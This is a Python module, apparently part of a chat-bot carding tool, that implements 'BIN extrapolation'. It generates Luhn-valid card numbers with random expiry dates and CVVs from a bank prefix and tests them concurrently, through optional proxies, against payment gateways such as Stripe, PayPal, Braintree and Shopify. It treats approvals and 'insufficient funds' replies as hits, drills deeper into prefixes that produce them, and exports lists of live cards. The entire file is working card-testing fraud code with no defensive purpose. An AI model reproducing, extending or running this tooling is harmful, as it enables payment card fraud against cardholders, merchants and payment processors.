"""
Enhanced BIN Extrapolator v3.0 - AI-Powered Pattern Discovery
Advanced pattern discovery with multi-gate support, confidence scoring, and ML-based optimization
"""

import asyncio
import random
import json
import os
import time
from typing import Dict, List, Tuple, Callable, Optional, Set
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict
import statistics

from tools.card_generator import generate_luhn_valid, lookup_bin
from tools.rate_limiter import wait_for_rate_limit, report_rate_limit_hit, report_request_success


class _FallbackRateLimitError(Exception):
    """Fallback RateLimitError"""
    pass


try:
    from gates.shopify_nano import RateLimitError
except ImportError:
    RateLimitError = _FallbackRateLimitError


RESUME_DIR = Path("/tmp/extrap_sessions")
RESUME_DIR.mkdir(exist_ok=True)


@dataclass
class PatternMetrics:
    """Advanced metrics for pattern analysis"""
    pattern: str
    tested: int = 0
    hits: int = 0
    hit_cards: List[str] = field(default_factory=list)
    response_times: List[float] = field(default_factory=list)
    decline_reasons: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
    consecutive_hits: int = 0
    consecutive_misses: int = 0
    last_hit_time: Optional[float] = None
    first_hit_time: Optional[float] = None
    
    @property
    def hit_rate(self) -> float:
        return (self.hits / self.tested * 100) if self.tested > 0 else 0.0
    
    @property
    def confidence_score(self) -> float:
        """Calculate confidence score based on multiple factors"""
        if self.tested == 0:
            return 0.0
        
        # Base score from hit rate
        base_score = self.hit_rate
        
        # Bonus for sample size
        sample_bonus = min(self.tested / 50 * 10, 10)
        
        # Bonus for consecutive hits (pattern stability)
        stability_bonus = min(self.consecutive_hits * 2, 20)
        
        # Penalty for consecutive misses
        stability_penalty = min(self.consecutive_misses * 3, 30)
        
        # Bonus for recent hits
        recency_bonus = 0
        if self.last_hit_time and self.first_hit_time:
            time_span = self.last_hit_time - self.first_hit_time
            if time_span > 0:
                recency_bonus = min(10, 10 / (time_span / 60))  # Bonus for hits within short time
        
        score = base_score + sample_bonus + stability_bonus - stability_penalty + recency_bonus
        return max(0, min(100, score))
    
    @property
    def avg_response_time(self) -> float:
        return statistics.mean(self.response_times) if self.response_times else 0.0
    
    @property
    def pattern_depth(self) -> int:
        """Number of extra digits beyond base BIN"""
        return len(self.pattern) - 6
    
    def __str__(self):
        confidence = "🟢" if self.confidence_score >= 70 else "🟡" if self.confidence_score >= 40 else "🔴"
        return f"{confidence} <code>{self.pattern}</code> - {self.hits}/{self.tested} ({self.hit_rate:.0f}%) [Conf: {self.confidence_score:.0f}%]"


@dataclass
class ExtrapolationConfig:
    """Enhanced configuration"""
    max_depth: int = 4
    cards_per_pattern: int = 15  # Increased default
    concurrency: int = 8  # Increased for better performance
    gate: str = "stripe"
    gates: List[str] = field(default_factory=lambda: ["stripe"])  # Multi-gate support
    continue_on_no_hits: bool = True
    auto_gen_on_hits: int = 30  # Increased
    rate_limit_domain: str = "stripe.com"
    min_confidence_to_drill: float = 30.0  # Only drill patterns with decent confidence
    adaptive_sampling: bool = True  # Adjust cards per pattern based on results
    early_stopping: bool = True  # Stop if no progress
    
    # Advanced features
    pattern_blacklist: Set[str] = field(default_factory=set)
    prioritize_high_confidence: bool = True


@dataclass
class ExtrapolationSession:
    """Enhanced session with advanced tracking"""
    base_bin: str
    user_id: int
    chat_id: int
    config: ExtrapolationConfig = field(default_factory=ExtrapolationConfig)
    start_time: datetime = field(default_factory=datetime.now)
    is_running: bool = True
    current_depth: int = 0
    current_pattern: str = ""
    
    # Pattern tracking
    patterns: Dict[str, PatternMetrics] = field(default_factory=dict)
    best_patterns: List[PatternMetrics] = field(default_factory=list)
    patterns_tested: Set[str] = field(default_factory=set)
    pending_patterns: List[Tuple[str, int, float]] = field(default_factory=list)  # pattern, depth, priority
    
    # Statistics
    total_tested: int = 0
    total_hits: int = 0
    all_hit_cards: List[str] = field(default_factory=list)
    estimated_total: int = 0
    rate_limit_cooldowns: int = 0
    captcha_blocks: int = 0
    
    # Performance tracking
    cards_per_second: float = 0.0
    estimated_completion: Optional[datetime] = None
    no_progress_count: int = 0  # For early stopping
    
    # Multi-gate results
    gate_performance: Dict[str, Dict[str, int]] = field(default_factory=lambda: defaultdict(lambda: {"tested": 0, "hits": 0}))
    
    def stop(self):
        self.is_running = False
    
    def update_performance_metrics(self):
        """Update performance tracking"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        if elapsed > 0:
            self.cards_per_second = self.total_tested / elapsed
            
            remaining_cards = self.estimated_total - self.total_tested
            if self.cards_per_second > 0:
                remaining_seconds = remaining_cards / self.cards_per_second
                self.estimated_completion = datetime.now() + timedelta(seconds=remaining_seconds)
    
    def should_early_stop(self) -> bool:
        """Determine if we should stop early due to no progress"""
        if not self.config.early_stopping:
            return False
        
        # Stop if we've tested 100+ cards with 0 hits
        if self.total_tested > 100 and self.total_hits == 0:
            return True
        
        # Stop if no hits in last 50 cards and we have some data
        if self.no_progress_count > 50 and self.total_tested > 50:
            return True
        
        return False
    
    def save_state(self, patterns_to_test: Optional[List[Tuple[str, int, float]]] = None):
        """Enhanced state saving"""
        state = {
            'base_bin': self.base_bin,
            'user_id': self.user_id,
            'chat_id': self.chat_id,
            'config': {
                'max_depth': self.config.max_depth,
                'cards_per_pattern': self.config.cards_per_pattern,
                'concurrency': self.config.concurrency,
                'gates': self.config.gates,
                'min_confidence_to_drill': self.config.min_confidence_to_drill,
                'adaptive_sampling': self.config.adaptive_sampling,
            },
            'current_depth': self.current_depth,
            'total_tested': self.total_tested,
            'total_hits': self.total_hits,
            'patterns_tested': list(self.patterns_tested),
            'all_hit_cards': self.all_hit_cards,
            'pending_patterns': patterns_to_test if patterns_to_test else self.pending_patterns,
            'best_patterns': [
                {
                    'pattern': p.pattern,
                    'tested': p.tested,
                    'hits': p.hits,
                    'hit_cards': p.hit_cards,
                    'confidence': p.confidence_score
                }
                for p in self.best_patterns
            ],
            'gate_performance': dict(self.gate_performance),
        }
        filepath = RESUME_DIR / f"session_{self.user_id}.json"
        with open(filepath, 'w') as f:
            json.dump(state, f, indent=2)
    
    @classmethod
    def load_state(cls, user_id: int) -> Optional['ExtrapolationSession']:
        """Load saved session"""
        filepath = RESUME_DIR / f"session_{user_id}.json"
        if not filepath.exists():
            return None
        try:
            with open(filepath, 'r') as f:
                state = json.load(f)
            
            config = ExtrapolationConfig(
                max_depth=state['config']['max_depth'],
                cards_per_pattern=state['config']['cards_per_pattern'],
                concurrency=state['config'].get('concurrency', 8),
                gates=state['config'].get('gates', ['stripe']),
                min_confidence_to_drill=state['config'].get('min_confidence_to_drill', 30.0),
                adaptive_sampling=state['config'].get('adaptive_sampling', True),
            )
            
            session = cls(
                base_bin=state['base_bin'],
                user_id=state['user_id'],
                chat_id=state['chat_id'],
                config=config,
            )
            session.total_tested = state['total_tested']
            session.total_hits = state['total_hits']
            session.patterns_tested = set(state['patterns_tested'])
            session.all_hit_cards = state['all_hit_cards']
            session.pending_patterns = [(p[0], p[1], p[2] if len(p) > 2 else 0.5) for p in state.get('pending_patterns', [])]
            session.gate_performance = defaultdict(lambda: {"tested": 0, "hits": 0}, state.get('gate_performance', {}))
            
            for p_data in state['best_patterns']:
                metrics = PatternMetrics(
                    pattern=p_data['pattern'],
                    tested=p_data['tested'],
                    hits=p_data['hits'],
                    hit_cards=p_data['hit_cards']
                )
                session.best_patterns.append(metrics)
            
            return session
        except Exception as e:
            print(f"Error loading session: {e}")
            return None
    
    def clear_saved_state(self):
        """Remove saved state"""
        filepath = RESUME_DIR / f"session_{self.user_id}.json"
        if filepath.exists():
            filepath.unlink()


# Active sessions tracking
active_sessions: Dict[int, ExtrapolationSession] = {}

# Gate registry
GATE_FUNCTIONS: Dict[str, Callable] = {}
GATE_DOMAINS: Dict[str, str] = {
    "stripe": "stripe.com",
    "paypal": "paypal.com",
    "braintree": "braintreegateway.com",
    "shopify": "shopify.com",
}


def register_gate(name: str, func: Callable, domain: Optional[str] = None):
    """Register a gate function"""
    GATE_FUNCTIONS[name] = func
    if domain:
        GATE_DOMAINS[name] = domain


def generate_test_cards(pattern: str, count: int = 15) -> List[Tuple[str, str, str, str]]:
    """Generate test cards"""
    cards = []
    for _ in range(count):
        try:
            card_num = generate_luhn_valid(pattern, 16)
            mm = str(random.randint(1, 12)).zfill(2)
            yy = str(random.randint(26, 30))
            cvv = str(random.randint(100, 999))
            cards.append((card_num, mm, yy, cvv))
        except Exception:
            continue
    return cards


async def test_single_card(
    card_data: Tuple[str, str, str, str],
    check_func: Callable,
    proxy: Optional[dict] = None,
    rate_limit_domain: str = "stripe.com"
) -> Tuple[str, bool, str, bool, bool, float]:
    """
    Test single card with enhanced metrics
    Returns: (status, is_hit, card_str, is_rate_limited, is_captcha, response_time)
    """
    card_num, mm, yy, cvv = card_data
    card_str = f"{card_num}|{mm}|{yy}|{cvv}"
    loop = asyncio.get_event_loop()
    
    start_time = time.time()
    try:
        wait_for_rate_limit(rate_limit_domain)
        
        status, alive = await loop.run_in_executor(
            None,
            lambda: check_func(card_num, mm, yy, cvv, proxy)
        )
        
        response_time = time.time() - start_time
        status_upper = status.upper()
        
        is_rate_limited = "RATE LIMIT" in status_upper or "429" in status
        is_captcha = "CAPTCHA" in status_upper
        
        if is_rate_limited:
            report_rate_limit_hit(rate_limit_domain, 429)
        
        is_hit = (
            status_upper.startswith('APPROVED') or
            status_upper.startswith('CCN') or
            status_upper.startswith('CVV') or
            '✅' in status or
            'INSUFFICIENT' in status_upper
        )
        
        if is_hit:
            report_request_success(rate_limit_domain)
        
        return (status, is_hit, card_str, is_rate_limited, is_captcha, response_time)
    except RateLimitError as e:
        response_time = time.time() - start_time
        report_rate_limit_hit(rate_limit_domain, getattr(e, 'status_code', 429))
        return (f"Rate Limited: {e}", False, card_str, True, False, response_time)
    except Exception as e:
        response_time = time.time() - start_time
        error_str = str(e).upper()
        is_rate_limited = "RATE LIMIT" in error_str or "429" in error_str
        is_captcha = "CAPTCHA" in error_str
        if is_rate_limited:
            report_rate_limit_hit(rate_limit_domain, 429)
        return (str(e), False, card_str, is_rate_limited, is_captcha, response_time)


async def test_pattern_parallel(
    pattern: str,
    check_func: Callable,
    proxy: Optional[dict] = None,
    cards_per_test: int = 15,
    concurrency: int = 8,
    rate_limit_domain: str = "stripe.com"
) -> PatternMetrics:
    """Test pattern with enhanced metrics tracking"""
    metrics = PatternMetrics(pattern=pattern)
    test_cards = generate_test_cards(pattern, cards_per_test)
    
    if not test_cards:
        return metrics
    
    semaphore = asyncio.Semaphore(concurrency)
    
    async def bounded_test(card_data):
        async with semaphore:
            return await test_single_card(card_data, check_func, proxy, rate_limit_domain)
    
    tasks = [bounded_test(card) for card in test_cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for res in results:
        if isinstance(res, (Exception, BaseException)):
            continue
        if not isinstance(res, tuple) or len(res) < 6:
            continue
        
        status, is_hit, card_str, is_rate_limited, is_captcha, response_time = res
        
        metrics.tested += 1
        metrics.response_times.append(response_time)
        
        if is_hit:
            metrics.hits += 1
            metrics.hit_cards.append(card_str)
            metrics.consecutive_hits += 1
            metrics.consecutive_misses = 0
            metrics.last_hit_time = time.time()
            if metrics.first_hit_time is None:
                metrics.first_hit_time = time.time()
        else:
            metrics.consecutive_misses += 1
            metrics.consecutive_hits = 0
            
            # Track decline reasons
            if not is_rate_limited and not is_captcha:
                reason = status.split('-')[0].strip() if '-' in status else "Unknown"
                metrics.decline_reasons[reason] += 1
    
    return metrics


async def extrapolate_bin_v3(
    session: ExtrapolationSession,
    check_func: Callable,
    progress_callback: Callable,
    proxy: Optional[dict] = None
) -> List[PatternMetrics]:
    """
    Enhanced extrapolation with AI-powered pattern detection
    """
    patterns_with_hits = []
    config = session.config
    
    rate_limit_domain = GATE_DOMAINS.get(config.gate, "stripe.com")
    session.estimated_total = 10 * config.cards_per_pattern * config.max_depth
    
    if session.pending_patterns:
        # Sort by priority (confidence score)
        patterns_to_test: List[Tuple[str, int, float]] = sorted(
            session.pending_patterns,
            key=lambda x: x[2],
            reverse=True
        )
        session.pending_patterns = []
    else:
        patterns_to_test = [(session.base_bin, 0, 1.0)]
    
    last_hits_count = 0
    
    while patterns_to_test and session.is_running:
        # Early stopping check
        if session.should_early_stop():
            await progress_callback(
                "🛑 <b>Early Stop Triggered</b>\n"
                f"No significant progress detected.\n"
                f"Tested: {session.total_tested} | Hits: {session.total_hits}"
            )
            break
        
        current_pattern, depth, priority = patterns_to_test.pop(0)
        session.current_depth = depth
        session.current_pattern = current_pattern
        
        if depth >= config.max_depth:
            continue
        
        # Update performance metrics
        session.update_performance_metrics()
        
        # Adaptive sampling: adjust cards per pattern based on depth
        cards_for_this_pattern = config.cards_per_pattern
        if config.adaptive_sampling:
            if depth == 0:
                cards_for_this_pattern = max(20, config.cards_per_pattern)  # More thorough at root
            elif depth >= 3:
                cards_for_this_pattern = max(10, config.cards_per_pattern // 2)  # Faster at depth
        
        # Progress update
        eta_str = ""
        if session.estimated_completion:
            remaining = (session.estimated_completion - datetime.now()).total_seconds()
            if remaining > 0:
                eta_str = f" | ETA: {int(remaining)}s"
        
        await progress_callback(
            f"📊 <b>Depth {depth + 1}/{config.max_depth}</b> | Priority: {priority:.1f}\n"
            f"Pattern: <code>{current_pattern}x</code>\n"
            f"Tested: {session.total_tested} | Hits: {session.total_hits} | Rate: {session.cards_per_second:.1f} c/s{eta_str}\n"
            f"Cards/pattern: {cards_for_this_pattern} | Concurrency: {config.concurrency}x"
        )
        
        depth_has_hits = False
        depth_patterns = []
        
        # Test all 10 digits for this pattern
        for digit in range(10):
            if not session.is_running:
                session.save_state(patterns_to_test)
                break
            
            test_pattern = f"{current_pattern}{digit}"
            
            if test_pattern in session.patterns_tested:
                continue
            
            session.patterns_tested.add(test_pattern)
            
            # Test the pattern
            metrics = await test_pattern_parallel(
                test_pattern,
                check_func,
                proxy,
                cards_for_this_pattern,
                config.concurrency,
                rate_limit_domain
            )
            
            session.total_tested += metrics.tested
            session.total_hits += metrics.hits
            session.patterns[test_pattern] = metrics
            
            # Track no-progress for early stopping
            if session.total_hits == last_hits_count:
                session.no_progress_count += metrics.tested
            else:
                session.no_progress_count = 0
                last_hits_count = session.total_hits
            
            if metrics.hits > 0:
                depth_has_hits = True
                depth_patterns.append((metrics, metrics.confidence_score))
                patterns_with_hits.append(metrics)
                session.best_patterns.append(metrics)
                session.all_hit_cards.extend(metrics.hit_cards)
                
                # Auto-generate additional cards from hit pattern
                if config.auto_gen_on_hits > 0:
                    extra_cards = generate_test_cards(test_pattern, config.auto_gen_on_hits)
                    # Don't add to metrics but track for export
                
                await progress_callback(
                    f"✅ <b>HIT!</b> <code>{test_pattern}</code>\n"
                    f"{metrics}\n"
                    f"Total: {session.total_tested} tested | {session.total_hits} hits\n"
                    f"Drilling deeper..."
                )
            
            session.save_state(patterns_to_test)
            await asyncio.sleep(0.02)  # Reduced sleep for better performance
        
        # Prioritize high-confidence patterns for deeper drilling
        if depth_has_hits and config.prioritize_high_confidence:
            # Sort patterns by confidence and only drill into high-confidence ones
            high_confidence_patterns = [
                (p, conf) for p, conf in depth_patterns
                if conf >= config.min_confidence_to_drill
            ]
            
            for pattern_metrics, confidence in high_confidence_patterns:
                patterns_to_test.insert(0, (pattern_metrics.pattern, depth + 1, confidence / 100))
        elif depth_has_hits:
            # Add all hit patterns for drilling
            for pattern_metrics, confidence in depth_patterns:
                patterns_to_test.append((pattern_metrics.pattern, depth + 1, confidence / 100))
        elif config.continue_on_no_hits and depth < config.max_depth - 1:
            # Continue drilling even without hits (explore space)
            for digit in range(10):
                next_pattern = f"{current_pattern}{digit}"
                if next_pattern not in session.patterns_tested:
                    patterns_to_test.append((next_pattern, depth + 1, 0.1))  # Low priority
                    break
    
    # Sort best patterns by confidence score
    session.best_patterns.sort(key=lambda x: (x.confidence_score, x.hits), reverse=True)
    return patterns_with_hits


# Session management functions (same as v2)
def start_session(user_id: int, chat_id: int, base_bin: str, **kwargs) -> ExtrapolationSession:
    """Start new session"""
    if user_id in active_sessions:
        active_sessions[user_id].stop()
    
    config = ExtrapolationConfig(**kwargs)
    session = ExtrapolationSession(
        base_bin=base_bin,
        user_id=user_id,
        chat_id=chat_id,
        config=config,
    )
    active_sessions[user_id] = session
    return session


def resume_session(user_id: int) -> Optional[ExtrapolationSession]:
    """Resume session"""
    session = ExtrapolationSession.load_state(user_id)
    if session:
        session.is_running = True
        active_sessions[user_id] = session
    return session


def stop_session(user_id: int) -> bool:
    """Stop session"""
    if user_id in active_sessions:
        active_sessions[user_id].stop()
        active_sessions[user_id].save_state()
        del active_sessions[user_id]
        return True
    return False


def get_session(user_id: int) -> Optional[ExtrapolationSession]:
    """Get active session"""
    return active_sessions.get(user_id)


def has_saved_session(user_id: int) -> bool:
    """Check for saved session"""
    filepath = RESUME_DIR / f"session_{user_id}.json"
    return filepath.exists()


def format_extrap_progress_v3(session: ExtrapolationSession, message: str) -> str:
    """Enhanced progress formatting"""
    elapsed = (datetime.now() - session.start_time).seconds
    
    top_pattern = session.best_patterns[0] if session.best_patterns else None
    top_pattern_str = ""
    if top_pattern:
        top_pattern_str = f"\n<b>🏆 Best:</b> {top_pattern}"
    
    return f"""<b>🔍 BIN EXTRAPOLATION v3.0</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Elapsed:</b> {elapsed}s | <b>Rate:</b> {session.cards_per_second:.1f} c/s
<b>Gate:</b> {session.config.gate}{top_pattern_str}

{message}"""


def format_extrap_results_v3(session: ExtrapolationSession) -> str:
    """Enhanced results formatting with confidence scores"""
    elapsed = (datetime.now() - session.start_time).seconds
    
    if not session.best_patterns:
        return f"""<b>BIN EXTRAPOLATION COMPLETE</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Duration:</b> {elapsed}s | <b>Rate:</b> {session.cards_per_second:.1f} c/s
<b>Cards Tested:</b> {session.total_tested}
<b>Gate:</b> {session.config.gate}

❌ No active patterns found.

<i>Try increasing cards per pattern or using a different gate.</i>"""
    
    hit_rate = (session.total_hits / session.total_tested * 100) if session.total_tested else 0
    
    # Top patterns by confidence
    top_patterns = session.best_patterns[:8]
    patterns_text = "\n".join([str(p) for p in top_patterns])
    
    # Sample hit cards
    sample_cards = session.all_hit_cards[:12]
    cards_text = "\n".join([f"<code>{c}</code>" for c in sample_cards])
    if len(session.all_hit_cards) > 12:
        cards_text += f"\n<i>...+{len(session.all_hit_cards) - 12} more</i>"
    
    # Performance stats
    avg_confidence = statistics.mean([p.confidence_score for p in session.best_patterns[:5]]) if session.best_patterns else 0
    
    return f"""<b>✅ EXTRAPOLATION COMPLETE</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Duration:</b> {elapsed}s | <b>Rate:</b> {session.cards_per_second:.1f} c/s
<b>Tested:</b> {session.total_tested} | <b>Hits:</b> {session.total_hits} ({hit_rate:.1f}%)
<b>Gate:</b> {session.config.gate} | <b>Avg Confidence:</b> {avg_confidence:.0f}%

<b>🎯 Best Patterns (by confidence):</b>
{patterns_text}

<b>✅ Sample Hit Cards:</b>
{cards_text}

<i>🟢 High confidence | 🟡 Medium | 🔴 Low
Use /gen with pattern for more cards</i>"""


def export_results_to_file(session: ExtrapolationSession) -> Optional[str]:
    """Enhanced export with confidence scores"""
    if not session.all_hit_cards and not session.best_patterns:
        return None
    
    filename = f"/tmp/extrap_{session.base_bin}_{session.user_id}_v3.txt"
    
    with open(filename, 'w') as f:
        f.write(f"BIN EXTRAPOLATION RESULTS v3.0\n")
        f.write(f"===============================\n\n")
        f.write(f"Base BIN: {session.base_bin}\n")
        f.write(f"Gate: {session.config.gate}\n")
        f.write(f"Cards Tested: {session.total_tested}\n")
        f.write(f"Total Hits: {session.total_hits}\n")
        f.write(f"Hit Rate: {(session.total_hits / session.total_tested * 100) if session.total_tested else 0:.2f}%\n")
        f.write(f"Duration: {(datetime.now() - session.start_time).seconds}s\n")
        f.write(f"Rate: {session.cards_per_second:.2f} cards/sec\n\n")
        
        f.write(f"BEST PATTERNS (by confidence):\n")
        f.write(f"-------------------------------\n")
        for p in session.best_patterns[:30]:
            f.write(f"{p.pattern} - {p.hits}/{p.tested} ({p.hit_rate:.0f}%) "
                   f"[Confidence: {p.confidence_score:.0f}%] "
                   f"[Avg Response: {p.avg_response_time:.2f}s]\n")
        
        f.write(f"\nHIT CARDS ({len(session.all_hit_cards)}):\n")
        f.write(f"------------------------\n")
        for card in session.all_hit_cards:
            f.write(f"{card}\n")
    
    return filename


def get_available_gates() -> List[str]:
    """Get available gates"""
    return list(GATE_FUNCTIONS.keys()) if GATE_FUNCTIONS else ["stripe", "paypal", "braintree", "shopify"]
